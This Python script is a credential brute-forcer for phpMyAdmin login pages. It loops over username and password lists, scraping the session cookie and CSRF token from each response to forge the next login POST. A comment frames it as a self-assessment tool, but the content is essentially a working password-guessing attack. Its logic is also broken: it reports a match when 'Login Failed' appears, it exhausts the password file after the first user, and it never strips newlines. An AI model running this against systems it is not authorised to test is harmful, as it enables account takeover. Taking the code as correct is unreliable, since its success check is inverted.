'''
This script was developed from example of brute forcing phpmyadmin site to assisst in developing similar Tools for self assessment of own web applications


#######

So need to write a python program that does following:

1. grabs from every response the set_session cookie and token from html body 

2. make a POST request with grabbed items

phpMyAdmin cookie = set_session_cookie

set_session=set_session_cookie&pma_username=USER_LIST&pma_password=PASS_LIST&server=1&target=index.php&lang=en&debug=0&token=FORM_TOKEN

3. evaluate to not have "Login Failed" in reposnse body
'''

import requests
import re
#import base64
import sys

URL = sys.argv[1]
USER_FILE = sys.argv[2]
PASS_FILE = sys.argv[3]
#INIT_TOKEN = sys.argv[4]
#INIT_COOKIE = sys.argv[5]

def forge_post(url, token, in_cookie, username, password):

    #Template
    '''
    POST /index.php HTTP/1.1
    Host: 192.168.164.52
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 168
    Origin: null
    Connection: close
    Cookie: phpMyAdmin=1c40ba8456f1825f791056a366834e94
    Upgrade-Insecure-Requests: 1

    set_session=1c40ba8456f1825f791056a366834e94&pma_username=dfgdfg&pma_password=dfgdfgdfg&server=1&target=index.php&lang=en&debug=0&token=c392014ef9958cce5d96b4b0bffa2879
    '''

    #own post session
    session = requests.Session()


    headers = {
        "User-Agent" : "iamjonny the tester",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "null",
        "Upgrade-Insecure-Requests": "1"
    }

    cookies = {
        "phpMyAdmin":in_cookie
    }

    payload ={
        "set_session" : in_cookie,
        "pma_username" :  username,
        "pma_password" : password,
        "server" : 1,
        "target" : "index.php",
        "lang" : "en",
        "debug" : 0,
        "token" : token
    }


    resp = session.post(url, headers = headers, data=payload, cookies=cookies)

    return resp

def analyze_resp(resp):

    password_correct = False
    
    #extract response cookie from set_session in html body

    session_match = re.search(r'set_session" value="([a-f0-9]+)"', resp.text)
    
    if session_match:
        next_cookie = session_match.groups(0)[0]
        print("set_session cookie:", next_cookie)
    else:
        return 0

    #extract response cookie from token in html body

    token_match = re.search(r'token" value="([a-f0-9]+)"', resp.text)
    
    if token_match:
        token = token_match.groups(0)[0]
        print("Token value:", token)
    else:
        return 0

    # search for positive password feedback in html body

    fail_match = re.search(r'Login Failed', resp.text)

    if fail_match.group(0) == 'Login Failed':
        password_correct = True

    return (next_cookie, token, password_correct)


###########################################   MAIN   #############################################

def main():

    #init session
    initial_session = requests.Session()

    #initial GET request
    resp = initial_session.get(URL)
    (cookie, token, password_correct) = analyze_resp(resp)

    with open(USER_FILE,"r") as u:
        with open(PASS_FILE,"r") as f:

            for user in u.readlines():
                # password match flag
                password_correct = False

                for password in f.readlines():
                    resp = forge_post(URL, token, cookie, user, password)
                    (cookie, token, password_correct) = analyze_resp(resp)
                    
                    if password_correct:
                        print(f"[+] Credential match > {user}:{password}")
                        break


    return 0

######################################################################################

if __name__ == "__main__":
    main()